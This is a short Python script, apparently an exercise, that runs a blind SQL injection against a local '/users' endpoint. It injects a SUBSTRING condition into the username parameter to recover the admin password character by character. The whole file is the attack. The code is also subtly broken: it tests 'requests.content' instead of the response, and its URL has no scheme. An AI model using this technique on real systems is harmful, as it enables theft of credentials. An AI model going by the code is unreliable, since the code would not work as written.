import requests

charS = []
user = "admin' "
for x in range(97,123):
	charS.append(int(x))

for x in range(48,58):
	charS.append(int(x))

print(charS)
for i in range(1,21):
	for x in charS:
		txt = user + " and SUBSTRING( password," + str(i) + ", 1) = '" + chr(x)
		# print(txt)
		requests.get('localhost:8080/users', params={'username': txt})
		if 'not' not in requests.content:
			print(chr(x))
			break
